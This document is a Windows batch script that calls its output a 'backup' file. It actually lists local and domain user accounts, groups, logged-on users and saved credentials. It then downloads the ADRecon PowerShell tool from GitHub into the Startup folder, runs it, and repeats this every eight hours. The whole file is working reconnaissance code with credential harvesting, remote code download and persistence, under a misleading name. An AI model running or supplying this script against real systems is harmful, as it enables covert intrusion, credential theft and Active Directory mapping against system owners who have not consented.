@echo off

:: Extract year, month, and day from the system's date
set YEAR=%DATE:~6,4%
set MONTH=%DATE:~0,2%
set DAY=%DATE:~3,2%

:: Extract hour, minute, and second from the system's time
set HOUR=%TIME:~0,2%
set MINUTE=%TIME:~3,2%
set SECOND=%TIME:~6,2%

:: Ensure hour, minute, and second are two digits (add leading zero if necessary)
if %HOUR% LSS 10 set HOUR=0%HOUR:~1,1%
if %MINUTE% LSS 10 set MINUTE=0%MINUTE:~1,1%
if %SECOND% LSS 10 set SECOND=0%SECOND:~1,1%

:loop
set OUTPUT=backup_%YEAR%-%MONTH%-%DAY%_%HOUR%-%MINUTE%-%SECOND%.txt
type nul > %OUTPUT%

echo Listing all user accounts: > %OUTPUT%
net user >> %OUTPUT%
echo ================================ >> %OUTPUT%

echo Listing all user folders: >> %OUTPUT%
dir C:\Users\ >> %OUTPUT%
echo ================================ >> %OUTPUT%

echo Listing saved credentials: >> %OUTPUT%
cmdkey.exe /list >> %OUTPUT%
echo ================================ >> %OUTPUT%

echo Members of the "Users" group: >> %OUTPUT%
net localgroup "Users" >> %OUTPUT%
echo ================================ >> %OUTPUT%

echo All local groups on the system: >> %OUTPUT%
net localgroup >> %OUTPUT%
echo ================================ >> %OUTPUT%

echo Listing logged on users: >> %OUTPUT%
query user /SERVER:%COMPUTERNAME% >> %OUTPUT%
echo ================================ >> %OUTPUT%

echo Listing all domain accounts: >> %OUTPUT%
net user /domain >> %OUTPUT%
echo ================================ >> %OUTPUT%

echo Listing all domain groups: >> %OUTPUT%
net group /domain >> %OUTPUT%
echo ================================ >> %OUTPUT%

echo Extracts info of an AD environment: >> %OUTPUT%
powershell -ExecutionPolicy RemoteSigned -Command "New-Item -Type Directory '$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup' -ErrorAction Ignore -Force | Out-Null"
powershell -ExecutionPolicy RemoteSigned -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/adrecon/ADRecon/refs/heads/master/ADRecon.ps1' -OutFile \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\ADRecon.ps1\""
powershell -executionpolicy remotesigned -Command "& \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\ADRecon.ps1\""

timeout /t 28800 >nul
goto loop
